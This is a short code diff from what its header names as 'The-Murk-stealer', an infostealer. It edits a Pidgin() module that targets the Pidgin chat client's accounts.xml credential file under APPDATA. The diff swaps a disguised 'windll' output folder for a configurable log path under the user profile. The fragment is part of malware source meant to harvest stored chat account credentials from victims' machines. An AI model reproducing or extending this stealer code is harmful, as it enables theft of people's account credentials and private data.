@@ -10,16 +10,18 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import getenv, mkdir
+from os import getenv, mkdir, environ
 from os.path import isfile
 from xml.etree.ElementTree import fromstring
 from manager.logger import Log
+from preferences.config import config
 
 
 def Pidgin():
     msgInfo = ""
     roaming = getenv('APPDATA')
-    pathToLogs = f"{getenv('LOCALAPPDATA')}\\windll"
+    user = environ['USERPROFILE']
+    pathToLogs = f'{user}\\{config.pathToLogs}'
     directory = [
         roaming + '\\.purple\\accounts.xml'
     ]
